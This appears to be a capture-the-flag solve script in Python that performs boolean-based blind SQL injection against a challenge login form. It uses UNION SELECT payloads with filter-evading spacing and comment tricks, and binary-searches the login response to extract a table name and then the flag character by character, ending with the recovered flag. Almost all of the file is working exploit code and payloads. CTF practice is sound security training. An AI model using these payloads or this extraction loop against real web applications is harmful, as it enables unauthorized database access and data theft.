import requests


def BS_len(l , r):
    while(l != r):
        m = l + int((r-l)/2)
        # for table length
        # payload = f"\\'/**/UNI ON/**/SEL ECT/**/1,2,table_name/**/FROM/**/info rmation_schema.tables/**/whe re/**/table_schema/**/LIKE/**/CHAR(100,98)&&length(table_name)>{m}#"
        # for FLAG length
        payload = f"\\'/**/UNI ON/**/SEL ECT/**/1,2,i_4m_th3_fl4g/**/FROM/**/`h3y_here_15_the_flag_y0u_w4nt,meow,flag`/**/whe re/**/i_4m_th3_fl4g/**/LIKE/**/CHAR(70,76,65,71,123,37)&&length(i_4m_th3_fl4g)>{m}#"
        # print(m)
        # print(payload)
        data = {'username': payload, 'password': 'guest'}
        res = requests.post('https://sqli.chal.h4ck3r.quest/login', data=data)
        if 'Welcome!' in res.text:
            l = m+1
        else:
            r = m
    print(r)

def BS_text(L, R, LEN):
    text = ''
    for i in range(1, LEN+1):
        l = L
        r = R
        while(l != r):
            m = l + int((r-l)/2)
            # for table name
            # payload = f"\\'/**/UNI ON/**/SEL ECT/**/1,2,table_name/**/FROM/**/info rmation_schema.tables/**/whe re/**/table_schema/**/LIKE/**/CHAR(100,98)&&length(table_name)>30&&ascii(mid(table_name,{i},1))>{m}#"
            # for FLAG !
            payload = f"\\'/**/UNI ON/**/SEL ECT/**/1,2,i_4m_th3_fl4g/**/FROM/**/`h3y_here_15_the_flag_y0u_w4nt,meow,flag`/**/whe re/**/i_4m_th3_fl4g/**/LIKE/**/CHAR(70,76,65,71,123,37)&&ascii(mid(i_4m_th3_fl4g,{i},1))>{m}#"

            # print(m)
            # print(payload)
            data = {'username': payload, 'password': 'guest'}
            res = requests.post('https://sqli.chal.h4ck3r.quest/login', data=data)
            if 'Welcome!' in res.text:
                l = m+1
            else:
                r = m
        text += chr(l)
        print(text)

# find table length: 39
# BS_len(0, 50)
# find table name: h3y_here_15_the_flag_y0u_w4nt,meow,flag
# BS_text(32, 127, 39)

# find FLAG length: 45
# BS_len(0, 50)
# find FLAG: FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli???}
BS_text(32, 127, 45)







